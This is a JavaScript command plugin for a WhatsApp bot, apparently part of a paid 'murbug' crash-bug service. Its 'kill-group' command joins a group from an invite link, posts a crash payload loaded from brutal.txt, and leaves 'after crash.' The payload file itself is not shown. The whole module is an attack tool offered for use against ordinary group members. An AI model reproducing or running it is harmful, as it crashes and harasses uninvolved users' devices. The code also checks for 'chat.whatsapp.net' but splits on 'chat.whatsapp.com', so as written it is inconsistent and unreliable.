const fs = require('fs');

module.exports = {
    command: 'kill-group',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const link = args[0];
        if (!link || !link.includes('chat.whatsapp.net')) return reply("Masukkan link grup yang valid!");

        const code = link.split('chat.whatsapp.com/')[1];
        const BRUTAL_FILE = './brutal.txt';

        try {
            if (!fs.existsSync(BRUTAL_FILE)) return reply("File payload brutal.txt tidak ditemukan.");
            
            const payload = fs.readFileSync(BRUTAL_FILE, 'utf-8');
            const finalChat = '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫\n' + payload;

            await reply(`Joining group and deploying payload...`);

            const jid = await sock.groupAcceptInvite(code);
            await sock.sendMessage(jid, { text: finalChat });
            
            // Leave after crash
            await sock.groupLeave(jid);

            reply(`Group killed successfully.`);
        } catch (err) {
            reply("Gagal eksekusi: " + err.message);
        }
    }
};
